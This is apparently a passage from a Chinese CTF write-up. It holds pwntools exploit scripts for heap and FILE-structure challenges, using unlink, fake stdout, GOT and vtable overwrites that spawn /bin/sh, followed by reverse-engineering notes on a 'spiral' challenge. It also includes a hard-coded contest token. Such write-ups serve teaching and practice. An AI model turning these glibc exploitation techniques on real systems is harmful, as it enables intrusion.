        io.sendline("5" * 0x10 + p64(0x6031e0 - 0x18)[:7])
        print io.readuntil("$")
        io.sendline("mkfile 12345")
        io.readuntil("something:")
        io.sendline("5" * 0x8 + p64(0x31)[:7])
        print io.readuntil("$")
        io.sendline("mkfile 12345")
        io.readuntil("something:")
        io.sendline(p64(0)[:7])
        print io.readuntil("$")
        io.sendline("mkfile 123")
        io.readuntil("something:")
        io.sendline("3" * 0x100 + p16(0x110))
        print io.readuntil("$")
        io.sendline("mkfile 12345")
        io.readuntil("something:")
        io.sendline("\x00")
        pause()
        #free 3 to make unlink attack
        print io.readuntil("$")
        io.sendline("mkfile 123456")
        io.readuntil("something:")
        io.sendline("3" * 0x19)
        print io.readuntil("$")
        io.sendline("mkfile 12345")
        io.readuntil("something:")
        io.sendline("\xcc" * 0x18 + p32(elf.got["strlen"]))
        io.readuntil("$")
        io.sendline("cat 12345")
        leak_libc = u64(io.readline()[1:-1].ljust(8,"\x00"))
        print hex(leak_libc)
        libc_base = leak_libc - libc.symbols["strlen"]
        one_gadget = libc.symbols["system"] + libc_base
        log.info("libc_base--->{}".format(hex(libc_base)))
        pause()
        print io.readuntil("$")
        io.sendline("mkfile 12345")
        io.readuntil("something:")
        io.sendline(p64(one_gadget)[:7])
        io.readuntil("$")
        io.sendline("mkdir /bin/sh")
        io.interactive()
### babyprintf_ver2
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    from __future__ import print_function
    from pwn import *
    binary = './babyprintf_ver2'
    elf = ELF(binary)
    libc = elf.libc
    io = process(binary, aslr = 0)
    #io = remote('150.109.44.250', 20005)
    context.log_level = 'debug'
    context.arch = elf.arch
    context.terminal = ['tmux', 'splitw', '-h']
    myu64 = lambda x: u64(x.ljust(8, '\0'))
    ub_offset = 0x3c4b30
    io.recvuntil("So I change the buffer location to ")
    code_base = int(io.recvuntil("\n")[:-1], 16) - 0x202010
    log.info("\033[33m" + hex(code_base) + "\033[0m")
    pay = 'a' * 0x10
    pay += p64(code_base+0x202030) * 2
    # now start the fake stdout
    # 0x155555327760 :       0x00000000fbad2887      0x00001555553277e3
    # 0x155555327770 :    0x00001555553277e3      0x00001555553277e3
    # 0x155555327780 :    0x00001555553277e3      0x00001555553277e3
    # 0x155555327790 :    0x00001555553277e3      0x00001555553277e3
    # 0x1555553277a0 :    0x00001555553277e4      0x0000000000000000
    # 0x1555553277b0 :    0x0000000000000000      0x0000000000000000
    # 0x1555553277c0 :    0x0000000000000000      0x0000155555326a00
    # 0x1555553277d0 :   0x0000000000000001      0xffffffffffffffff
    # 0x1555553277e0 :   0x000000000a000000      0x00001555553288c0
    # 0x1555553277f0 :   0xffffffffffffffff      0x0000000000000000
    # 0x155555327800 :   0x00001555553268c0      0x0000000000000000
    # 0x155555327810 :   0x0000000000000000      0x0000000000000000
    # 0x155555327820 :   0x00000000ffffffff      0x0000000000000000
    # 0x155555327830 :   0x0000000000000000      0x00001555553232a0
    pay += p64(0xfbad2887)
    pay += p64(code_base + 0x201fb0) # _IO_read_ptr
    pay += p64(code_base + 0x201fb0) # _IO_read_end
    pay += p64(code_base + 0x201fb0) # _IO_read_base
    pay += p64(code_base + 0x201fb0) # _IO_write_base
    pay += p64(code_base + 0x201fb0 + 8) # _IO_write_ptr
    pay += p64(code_base + 0x201fb0) # _IO_write_end
    pay += p64(code_base + 0x201fb0) # _IO_buf_base
    pay += p64(code_base + 0x201fb0 + 8) # _IO_buf_end
    pay += p64(0) * 4
    pay += p64(0x0000155555326a00)
    pay += p64(1)
    pay += p64(0xffffffffffffffff)
    pay += p64(0x0000000000000000)
    pay += p64(code_base + 0x202200) # bypass _IO_acquire_locks...
    pay += p64(0) * 3
    pay += p64(0x00000000ffffffff)
    pay += p64(0) * 2
    io.sendline(pay)
    io.recvuntil("permitted!\n")
    libc_addr = myu64(io.recvn(8)) - libc.symbols['puts']
    libc.address = libc_addr
    log.info("\033[33m" + hex(libc_addr) + "\033[0m")
    def www(addr, c):
        pay = 'a'.ljust(0x10)
        pay += p64(code_base+0x202030) * 2
        # now start the fake stdout
        # 0x155555327760 :       0x00000000fbad2887      0x00001555553277e3
        # 0x155555327770 :    0x00001555553277e3      0x00001555553277e3
        # 0x155555327780 :    0x00001555553277e3      0x00001555553277e3
        # 0x155555327790 :    0x00001555553277e3      0x00001555553277e3
        # 0x1555553277a0 :    0x00001555553277e4      0x0000000000000000
        # 0x1555553277b0 :    0x0000000000000000      0x0000000000000000
        # 0x1555553277c0 :    0x0000000000000000      0x0000155555326a00
        # 0x1555553277d0 :   0x0000000000000001      0xffffffffffffffff
        # 0x1555553277e0 :   0x000000000a000000      0x00001555553288c0
        # 0x1555553277f0 :   0xffffffffffffffff      0x0000000000000000
        # 0x155555327800 :   0x00001555553268c0      0x0000000000000000
        # 0x155555327810 :   0x0000000000000000      0x0000000000000000
        # 0x155555327820 :   0x00000000ffffffff      0x0000000000000000
        # 0x155555327831 :   0x0000000000000000      0x00001555553232a0
        pay += p64(0xfbad2887)
        pay += p64(code_base + 0x2020b3) # _IO_read_ptr
        pay += p64(code_base + 0x2020b3) # _IO_read_end
        pay += p64(code_base + 0x2020b3) # _IO_read_base
        pay += p64(code_base + 0x2020b3) # _IO_write_base
        pay += p64(code_base + 0x2020b3) # _IO_write_ptr
        pay += p64(code_base + 0x2020b3) # _IO_write_end
        pay += p64(addr) # _IO_buf_base
        pay += p64(code_base + 0x2020b3 + 1) # _IO_buf_end
        pay += p64(0) * 4
        pay += p64(code_base + 0x202030)
        pay += p64(1) # _fileno
        pay += p64(0xffffffffffffffff)
        pay += p64(0x0000000000000000)
        pay += p64(code_base + 0x202200) # bypass _IO_acquire_locks...
        pay += p64(0) * 3
        pay += p64(0x00000000ffffffff)
        pay += p64(0) * 2
        pay += p64(0x00000000ffffffff)
        io.sendline(pay)
        io.sendline(c)
    gdb.attach(io, '')
    www(libc.symbols['__malloc_hook'], 'a')
    io.sendline('%100000p')
    io.interactive()
### the end
    #/usr/bin/python
    from pwn import *
    context.endian = "little"
    context.os = "linux"
    context.arch = "amd64"  #i386
    context.word_size = 64   #32
    context.log_level = "debug" #info, warn, critical
    '''
    0x45216 execve("/bin/sh", rsp+0x30, environ)
    constraints:
      rax == NULL
    0x4526a execve("/bin/sh", rsp+0x30, environ)
    constraints:
      [rsp+0x30] == NULL
    0xf02a4 execve("/bin/sh", rsp+0x50, environ)
    constraints:
      [rsp+0x50] == NULL
    0xf1147 execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL
    '''
    global io
    binary = "./the_end"
    def write4(date):
        for one in data:
            io.send(p64(one[0]))
            io.send(chr(one[1]))
    #0x00007f436cc2d6e0 stdin->vtable
    #0x00007f436cc2e3e0 a pointer --> one byte
    #0x00007f436cc2e400 0x00007f436c9f67e9 
    #                   0x00007f436c95a2a4 one_gadget --> 3 bytes
    '''
    stdin->vtable  0x00007fa1e55679b8  0x00007fa1e55666e0
    '''
    if __name__ == "__main__":
        elf = ELF(binary)
        libc = ELF("./libc.so.6")
        pipe_argv = [binary,""]
        pipe_env = {"LD_PRELOAD":"./libc.so.6"}
        #io = process(pipe_argv, env=pipe_env)
        io = remote("150.109.46.159",20002)
        io.readuntil("Input your token:")
        io.sendline("Ooh0jQajnHvoGq2lTlMt9tkT0EkellEa")
        io.readuntil("here is a gift ")
        libc_sleep = int(io.readuntil(",")[2:-1], 16)
        libc_base = libc_sleep - libc.symbols["sleep"]
        log.info("libc_base-->{}".format(hex(libc_base)))
        one_gadget = 0xf02a4 + libc_base
        log.info(hex(one_gadget))
        stdin_vtable = 0x3c49b8 + libc_base
        io.readline()
        data = []
        data.append([libc_base + 0x3c4bf8 + 0, ((one_gadget) >> 0) & 0xff])
        data.append([libc_base + 0x3c4bf8 + 1, ((one_gadget) >> 8) & 0xff])
        data.append([libc_base + 0x3c4bf8 + 2, ((one_gadget) >> 16) & 0xff])
        data.append([libc_base + 0x3c49b8 + 1, ((0x3c4be0 + libc_base) >> 8) & 0xff])
        pause()
        write4(data)
        io.interactive()
        '''enter'''
        '''enter'''
        '''exec 1>&0'''
## Reverse
### spiral
main函数中比较简单  
输入通过argv[1]送入  
sub_12F9E0中检查格式，并返回除"hctf{}"外的字符个数，要求为73  
sub_12FB10中分隔输入，处理为46+27两段内容  
sub_12F430中检查第一段46个字符  
sub_12F070中解码并写出一个驱动  
sub_12E430中在注册表里注册该驱动
下文所有关于硬件虚拟化的了解都是基于做题时搜索查询的，可能会有不少错误，还望指出海涵。
#### check1(sub_12F430)
将每个字符分为高5位和低3位，分别保存成两个数组  
根据低3位在sub_12F650中变化高5位，变化的方法都是很简单的加和异或  
然后将两个数组合成一个，最后比较  
反向处理根据结果的奇数位字节反向变换偶数位字节，再合并即可
#### check2(spiral_core.sys)
在写出的函数中将后27个字符放入字节数组中，即作为驱动的data保存  
动调可获得完整内容